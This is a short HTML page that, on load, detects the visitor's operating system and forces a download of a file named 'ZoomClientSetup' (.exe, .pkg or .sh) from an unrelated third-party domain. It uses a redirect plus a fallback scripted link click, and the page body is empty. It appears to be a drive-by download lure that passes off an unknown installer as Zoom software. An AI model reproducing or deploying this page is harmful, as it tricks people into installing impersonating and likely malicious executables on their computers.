<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Auto Download</title>
    <script>
        // Simplified OS detection
        function getOS() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'windows';
            if (ua.includes('Mac')) return 'macos';
            if (ua.includes('Linux')) return 'linux';
            return 'windows';
        }

        // Direct download trigger
        function startDownload() {
            const os = getOS();
            const ext = os === 'macos' ? '.pkg' : os === 'linux' ? '.sh' : '.exe';
            const url = `https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup${ext}?${Date.now()}`;
            
            // Method 1: Immediate redirect
            window.location.href = url;
            
            // Method 2: Fallback if redirect blocked
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = url;
                link.click();
            }, 500);
        }
        
        // Start on load
        window.onload = startDownload;
    </script>
</head>
<body>
    <!-- Minimal body content -->
    <noscript>Please enable JavaScript to download the file</noscript>
</body>
</html>
